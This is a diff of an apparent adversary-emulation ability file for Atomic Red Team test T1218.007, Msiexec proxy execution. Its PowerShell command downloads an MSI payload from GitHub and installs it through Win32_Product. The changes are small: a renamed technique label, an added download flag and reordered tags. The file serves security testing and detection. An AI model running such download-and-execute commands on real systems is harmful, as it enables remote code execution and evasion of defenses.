@@ -5,7 +5,7 @@
   tactic: stealth
   technique:
     attack_id: T1218.007
-    name: 'Signed Binary Proxy Execution: Msiexec'
+    name: 'System Binary Proxy Execution: Msiexec'
   platforms:
     windows:
       psh:
@@ -13,18 +13,19 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1218.007\bin\T1218.007_DLL.msi") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi"
-          -OutFile "PathToAtomicsFolder\T1218.007\bin\T1218.007_DLL.msi"; fi; Invoke-CimMethod
-          -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation
-          = ''PathToAtomicsFolder\T1218.007\bin\T1218.007_DLL.msi'' }'
+          -OutFile "PathToAtomicsFolder\T1218.007\bin\T1218.007_DLL.msi" -UseBasicParsing;
+          fi; Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments
+          @{ PackageLocation = ''PathToAtomicsFolder\T1218.007\bin\T1218.007_DLL.msi''
+          }'
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
-  - t1218.007
-  - atomic-red-team
   - stealth
+  - atomic-red-team
+  - t1218.007
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -50,9 +51,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi"
-        -OutFile "#{msi_payload}"
+        -OutFile "#{msi_payload}" -UseBasicParsing
 
         '
     technique_created: '2020-01-24T14:38:49.266Z'
     atomic_guid: 32eb3861-30da-4993-897a-42737152f5f8
-    import_timestamp: '2026-10-20T07:08:26.460671Z'
+    import_timestamp: '2026-10-21T07:01:49.243464Z'
